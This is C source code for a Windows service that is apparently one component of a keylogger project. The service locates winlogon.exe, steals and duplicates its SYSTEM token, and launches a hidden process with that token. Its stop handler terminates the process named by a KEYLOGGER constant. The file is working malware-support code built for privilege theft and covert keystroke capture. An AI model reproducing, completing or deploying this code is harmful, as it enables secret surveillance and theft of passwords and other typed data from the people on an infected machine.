#include "service.h"

SERVICE_STATUS			service_status;
SERVICE_STATUS_HANDLE	service_status_handle;
HANDLE					service_stop = NULL;

int	get_name_pid(char *process)
{
	HANDLE			snapshot;
	PROCESSENTRY32	entry;
	int				pid;
	int				res;

	pid = 0;
	entry.dwSize = sizeof(PROCESSENTRY32);
	snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (snapshot == INVALID_HANDLE_VALUE)
		return (0);
	res = Process32First(snapshot, &entry);
	while (res)
	{
		if (!strcmp(process, entry.szExeFile))
		{
			pid = entry.th32ProcessID;
			break ;
		}
		res = Process32Next(snapshot, &entry);
	}
	CloseHandle(snapshot);
	return (pid);
}

HANDLE	get_process_token(char *process)
{
	HANDLE	token;
	int		pid;
	HANDLE	proc;

	pid = get_name_pid(process);
	proc = OpenProcess(PROCESS_ALL_ACCESS, TRUE, pid);
	OpenProcessToken(proc, TOKEN_ALL_ACCESS, &token);
	return (token);
}

int	report_status(DWORD status)
{
	static DWORD	check = 1;

	service_status.dwCurrentState = status;
	service_status.dwWin32ExitCode = 0;
	service_status.dwControlsAccepted = 0;
	service_status.dwCheckPoint = 0;
	service_status.dwServiceSpecificExitCode = 0;
	service_status.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
	if (status != SERVICE_START_PENDING)
		service_status.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
	if ((status != SERVICE_RUNNING) && (status != SERVICE_STOPPED))
		service_status.dwCheckPoint = check++;
	return (SetServiceStatus(service_status_handle, &service_status));
}

void WINAPI	control_handler(DWORD control)
{
	HANDLE	process;

	if (control != SERVICE_CONTROL_STOP)
		return ;
	report_status(SERVICE_STOP_PENDING);
	process = OpenProcess(PROCESS_TERMINATE, 0, get_name_pid(KEYLOGGER));
	if (process)
	{
		TerminateProcess(process, 9);
		SetEvent(service_stop);
		CloseHandle(process);
		report_status(SERVICE_STOPPED);
	}
}

void WINAPI	ServiceMain(DWORD dwNumServicesArgs, LPSTR *lpServiceArgVectors)
{
	HANDLE				token;
	HANDLE				duplicate;
	STARTUPINFO			info;
	PROCESS_INFORMATION	porc_info;

	(void)dwNumServicesArgs;
	service_status_handle = RegisterServiceCtrlHandler(NAME, control_handler);
	if (!service_status_handle)
		return ;
	report_status(SERVICE_START_PENDING);
	service_stop = CreateEvent(NULL, TRUE, FALSE, NULL);
	if (!service_stop)
		return ;
	report_status(SERVICE_RUNNING);
	token = get_process_token("winlogon.exe");
	DuplicateTokenEx(token, TOKEN_ALL_ACCESS, 0, SecurityImpersonation, TokenPrimary, &duplicate);
	info.cb = sizeof(info);
	CreateProcessAsUser(duplicate, 0, lpServiceArgVectors[1], 0, 0, FALSE, CREATE_NO_WINDOW, 0, 0, &info, &porc_info);
	WaitForSingleObject(porc_info.hProcess, INFINITE);
	CloseHandle(porc_info.hProcess);
	CloseHandle(porc_info.hThread);
	CloseHandle(token);
	CloseHandle(duplicate);
}

int	dispatch_service(void)
{
	SERVICE_TABLE_ENTRY	table[] = {
		{ NAME, (LPSERVICE_MAIN_FUNCTION)ServiceMain },
		{ NULL, NULL }
	};
	if (!StartServiceCtrlDispatcher(table))
		return (0);
	return (1);
}
